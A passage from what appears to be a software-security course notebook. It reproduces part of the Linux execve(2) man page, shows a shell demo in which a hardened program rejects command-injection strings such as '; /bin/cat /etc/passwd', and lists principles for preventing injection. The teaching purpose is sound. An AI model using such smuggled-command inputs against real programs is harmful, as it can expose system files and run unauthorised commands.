           also  places a floor of 32 pages on this size limit, so that, even when
           [1mRLIMIT_STACK [22mis set very low, applications are guaranteed  to  have  at
           least  as  much argument and environment space as was provided by Linux
           2.6.22 and earlier.  (This guarantee was not provided in  Linux  2.6.23
           and  2.6.24.)  Additionally, the limit per string is 32 pages (the ker‐
           nel constant [1mMAX_ARG_STRLEN[22m), and the  maximum  number  of  strings  is
           0x7FFFFFFF.
    
    [1mRETURN VALUE[0m
           On  success, [1mexecve[22m() does not return, on error -1 is returned, and [4mer‐[0m
           [4mrno[24m is set to indicate the error.
    
    [1mERRORS[0m
           [1mE2BIG  [22mThe total number of bytes in the environment ([4menvp[24m) and argument
                  list ([4margv[24m) is too large.
    
           [1mEACCES [22mSearch permission is denied on a component of the path prefix of
                  [4mpathname[24m or  the  name  of  a  script  interpreter.   (See  also
                  [1mpath_resolution[22m(7).)
    
           [1mEACCES [22mThe file or a script interpreter is not a regular file.
    
           [1mEACCES [22mExecute permission is denied for the file or a script or ELF in‐
                  terpreter.
    
           [1mEACCES [22mThe filesystem is mounted [4mnoexec[24m.
    
           [1mEAGAIN [22m(since Linux 3.1)
                  Having  changed  its  real UID using one of the [1mset*uid[22m() calls,
                  the caller was—and is now still—above its [1mRLIMIT_NPROC  [22mresource
                  limit  (see  [1msetrlimit[22m(2)).   For a more detailed explanation of
                  this error, see NOTES.
    
           [1mEFAULT [4m[22mpathname[24m or one of the pointers in  the  vectors  [4margv[24m  or  [4menvp[0m
                  points outside your accessible address space.
    
           [1mEINVAL [22mAn  ELF  executable  had  more than one PT_INTERP segment (i.e.,
                  tried to name more than one interpreter).
    
           [1mEIO    [22mAn I/O error occurred.
    
           [1mEISDIR [22mAn ELF interpreter was a directory.
    
           [1mELIBBAD[0m
                  An ELF interpreter was not in a recognized format.
    
           [1mELOOP  [22mToo many symbolic links were encountered in  resolving  [4mpathname[0m
                  or the name of a script or ELF interpreter.
    
           [1mELOOP  [22mThe  maximum recursion limit was reached during recursive script
                  interpretation (see "Interpreter scripts", above).  Before Linux
                  3.8, the error produced for this case was [1mENOEXEC[22m.
    
           [1mEMFILE [22mThe per-process limit on the number of open file descriptors has
                  been reached.
    
           [1mENAMETOOLONG[0m
                  [4mpathname[24m is too long.
    
           [1mENFILE [22mThe system-wide limit on the total number of open files has been
                  reached.
    
           [1mENOENT [22mThe file [4mpathname[24m or a script or ELF interpreter does not exist.
    
           [1mENOEXEC[0m
                  An executable is not in a recognized format, is  for  the  wrong
                  architecture,  or has some other format error that means it can‐
                  not be executed.
    
           [1mENOMEM [22mInsufficient kernel memory was available.
    
           [1mENOTDIR[0m
                  A component of the path prefix of [4mpathname[24m or a  script  or  ELF
                  interpreter is not a directory.
    
           [1mEPERM  [22mThe filesystem is mounted [4mnosuid[24m, the user is not the superuser,
                  and the file has the set-user-ID or set-group-ID bit set.
    
           [1mEPERM  [22mThe  process  is being traced, the user is not the superuser and
                  the file has the set-user-ID or set-group-ID bit set.
    
           [1mEPERM  [22mA "capability-dumb" applications would not obtain the  full  set
                  of  permitted  capabilities granted by the executable file.  See
                  [1mcapabilities[22m(7).
    
           [1mETXTBSY[0m
                  The specified executable was open for writing  by  one  or  more
                  processes.
    
    [1mVERSIONS[0m
           POSIX does not document the #! behavior, but it exists (with some vari‐
           ations) on other UNIX systems.
    
           On  Linux, [4margv[24m and [4menvp[24m can be specified as NULL.  In both cases, this
           has the same effect as specifying the argument as a pointer to  a  list
           containing  a  single null pointer.  [1mDo not take advantage of this non‐[0m
           [1mstandard and nonportable misfeature!  [22mOn many other UNIX systems, spec‐
           ifying [4margv[24m as NULL will result in an error ([1mEFAULT[22m).  [4mSome[24m other  UNIX
           systems treat the [4menvp==NULL[24m case the same as Linux.
    
           POSIX.1  says  that  values  returned by [1msysconf[22m(3) should be invariant
           over the lifetime of a process.  However, since Linux  2.6.23,  if  the
           [1mRLIMIT_STACK  [22mresource  limit  changes,  then  the  value  reported  by
           [1m_SC_ARG_MAX [22mwill also change, to reflect the fact  that  the  limit  on
           space  for holding command-line arguments and environment variables has
           changed.
    
       [1mInterpreter scripts[0m
           The kernel imposes a maximum length on the text that follows  the  "#!"
           characters  at  the  start of a script; characters beyond the limit are
           ignored.  Before Linux 5.1, the limit is 127 characters.   Since  Linux
           5.1, the limit is 255 characters.
    
           The  semantics  of  the  [4moptional-arg[24m argument of an interpreter script
           vary across implementations.  On Linux, the entire string following the
           [4minterpreter[24m name is passed as a single argument to the interpreter, and
           this string can include white space.  However, behavior differs on some
           other systems.  Some systems use the first white space to terminate [4mop‐[0m
           [4mtional-arg[24m.  On some systems, an interpreter script can  have  multiple
           arguments, and white spaces in [4moptional-arg[24m are used to delimit the ar‐
           guments.
    
           Linux (like most other modern UNIX systems) ignores the set-user-ID and
           set-group-ID bits on scripts.
    
    [1mSTANDARDS[0m
           POSIX.1-2008.
    
    [1mHISTORY[0m
           POSIX.1-2001, SVr4, 4.3BSD.
    
           With UNIX V6, the argument list of an [1mexec[22m() call was ended by 0, while
           the  argument  list  of [4mmain[24m was ended by -1.  Thus, this argument list
           was not directly usable in a further [1mexec[22m() call.  Since UNIX V7,  both
           are NULL.
    
    [1mNOTES[0m
           One  sometimes  sees  [1mexecve[22m()  (and the related functions described in
           [1mexec[22m(3)) described as "executing a [4mnew[24m process" (or similar).  This  is
           a  highly misleading description: there is no new process; many attrib‐
           utes of the calling process remain unchanged (in particular, its  PID).
           All  that [1mexecve[22m() does is arrange for an existing process (the calling
           process) to execute a new program.
    
           Set-user-ID and set-group-ID processes can not be [1mptrace[22m(2)d.
    
           The result of mounting a filesystem [4mnosuid[24m varies across  Linux  kernel
           versions:  some  will  refuse execution of set-user-ID and set-group-ID
           executables when this would give the user powers they did not have  al‐
           ready  (and  return  [1mEPERM[22m),  some will just ignore the set-user-ID and
           set-group-ID bits and [1mexec[22m() successfully.
    
           In most cases where [1mexecve[22m() fails, control returns to the original ex‐
           ecutable image, and the caller of [1mexecve[22m() can then handle  the  error.
           However,  in  (rare)  cases  (typically caused by resource exhaustion),
           failure may occur past the point of no return: the original  executable
           image  has  been  torn  down, but the new image could not be completely
           built.  In such cases, the kernel kills  the  process  with  a  [1mSIGSEGV[0m
           ([1mSIGKILL [22muntil Linux 3.17) signal.
    
       [1mexecve() and EAGAIN[0m
           A  more  detailed explanation of the [1mEAGAIN [22merror that can occur (since
           Linux 3.1) when calling [1mexecve[22m() is as follows.
    
           The [1mEAGAIN [22merror can occur when a  [4mpreceding[24m  call  to  [1msetuid[22m(2),  [1mse‐[0m
           [1mtreuid[22m(2),  or  [1msetresuid[22m(2)  caused the real user ID of the process to
           change, and that change caused the process to exceed  its  [1mRLIMIT_NPROC[0m
           resource limit (i.e., the number of processes belonging to the new real
           UID  exceeds  the resource limit).  From Linux 2.6.0 to Linux 3.0, this
           caused the [1mset*uid[22m() call to fail.  (Before  Linux  2.6,  the  resource
           limit was not imposed on processes that changed their user IDs.)
    
           Since  Linux  3.1,  the  scenario  just  described no longer causes the
           [1mset*uid[22m() call to fail, because it too  often  led  to  security  holes
           where  buggy  applications  didn't  check the return status and assumed
           that—if the caller had root privileges—the call would  always  succeed.
           Instead,  the [1mset*uid[22m() calls now successfully change the real UID, but
           the kernel sets an internal flag, named [1mPF_NPROC_EXCEEDED[22m, to note that
           the [1mRLIMIT_NPROC [22mresource limit has been exceeded.  If the [1mPF_NPROC_EX‐[0m
           [1mCEEDED [22mflag is set and the resource limit is still exceeded at the time
           of a subsequent [1mexecve[22m() call, that call fails with the  error  [1mEAGAIN[22m.
           This kernel logic ensures that the [1mRLIMIT_NPROC [22mresource limit is still
           enforced  for  the  common privileged daemon workflow—namely, [1mfork[22m(2) +
           [1mset*uid[22m() + [1mexecve[22m().
    
           If the resource limit was not still exceeded at the  time  of  the  [1mex‐[0m
           [1mecve[22m()  call (because other processes belonging to this real UID termi‐
           nated between the [1mset*uid[22m() call and the [1mexecve[22m() call), then  the  [1mex‐[0m
           [1mecve[22m()  call  succeeds  and  the  kernel  clears  the [1mPF_NPROC_EXCEEDED[0m
           process flag.  The flag is also cleared if a subsequent call to [1mfork[22m(2)
           by this process succeeds.
    
    [1mEXAMPLES[0m
           The following program is designed to be execed by  the  second  program
           below.  It just echoes its command-line arguments, one per line.
    
               /* myecho.c */
    
               #include <stdio.h>
               #include <stdlib.h>
    
               int
               main(int argc, char *argv[])
               {
                   for (size_t j = 0; j < argc; j++)
                       printf("argv[%zu]: %s\n", j, argv[j]);
    
                   exit(EXIT_SUCCESS);
               }
    
           This  program can be used to exec the program named in its command-line
           argument:
    
               /* execve.c */
    
               #include <stdio.h>
               #include <stdlib.h>
               #include <unistd.h>
    
               int
               main(int argc, char *argv[])
               {
                   static char *newargv[] = { NULL, "hello", "world", NULL };
                   static char *newenviron[] = { NULL };
    
                   if (argc != 2) {
                       fprintf(stderr, "Usage: %s <file-to-exec>\n", argv[0]);
                       exit(EXIT_FAILURE);
                   }
    
                   newargv[0] = argv[1];
    
                   execve(argv[1], newargv, newenviron);
                   perror("execve");   /* execve() returns only on error */
                   exit(EXIT_FAILURE);
               }
    
           We can use the second program to exec the first as follows:
    
               $ [1mcc myecho.c -o myecho[0m
               $ [1mcc execve.c -o execve[0m
               $ [1m./execve ./myecho[0m
               argv[0]: ./myecho
               argv[1]: hello
               argv[2]: world
    
           We can also use these programs to demonstrate the use of a  script  in‐
           terpreter.   To  do  this we create a script whose "interpreter" is our
           [4mmyecho[24m program:
    
               $ [1mcat > script[0m
               [1m#!./myecho script-arg[0m
               [1m^D[0m
               $ [1mchmod +x script[0m
    
           We can then use our program to exec the script:
    
               $ [1m./execve ./script[0m
               argv[0]: ./myecho
               argv[1]: script-arg
               argv[2]: ./script
               argv[3]: hello
               argv[4]: world
    
    [1mSEE ALSO[0m
           [1mchmod[22m(2), [1mexecveat[22m(2), [1mfork[22m(2), [1mget_robust_list[22m(2), [1mptrace[22m(2), [1mexec[22m(3),
           [1mfexecve[22m(3), [1mgetauxval[22m(3), [1mgetopt[22m(3), [1msystem[22m(3),  [1mcapabilities[22m(7),  [1mcre‐[0m
           [1mdentials[22m(7), [1menviron[22m(7), [1mpath_resolution[22m(7), [1mld.so[22m(8)
    
    Linux man-pages 6.05.01           2023-05-03                         [4mexecve[24m(2)


```bash
(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]
└─$ ./secure_catall "adfasdf; ls -al"
/bin/cat: 'adfasdf; ls -al': No such file or directory
  
  
(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/injection/secure]
└─$ ./secure_catall "adfasdf; /bin/cat /etc/passwd"
/bin/cat: 'adfasdf; /bin/cat /etc/passwd': No such file or directory
```

## Invoking External Commands in Other Languages

- risks of invoking external commands or command injection is not limited to C/C++ programs
- goal is to avoid problems similar to those caused by the system() function
- many languages allow system API, such as PHP, Perl, Python, etc.

## Major Principles for Mitigating Command Injection Attacks

### Principle of Isolation
    
- don't mix code with data
- various attacks such as system() code execution, XSS (Cross-site scripting), SQL Injection, Buffer Overflows are consequences of mixing code with data

### Principle of Least Privilege

- a privileged program should be given the just the right amount of power required to perform its tasks
- disable the privileges (temporarily or permenanently) when a privileged program doesn't need those
- in Linux, seteuid() and setuid() can be used to downgrade/upgrade privilege when needed
    - different OSes may provide different APIs
    
### Principle of Cleanup After

- discard the resources after they're done being used
- free/release memory used by dynamic variables created using **new**, **malac**, etc.
- close files and resources after their usages



```python

```
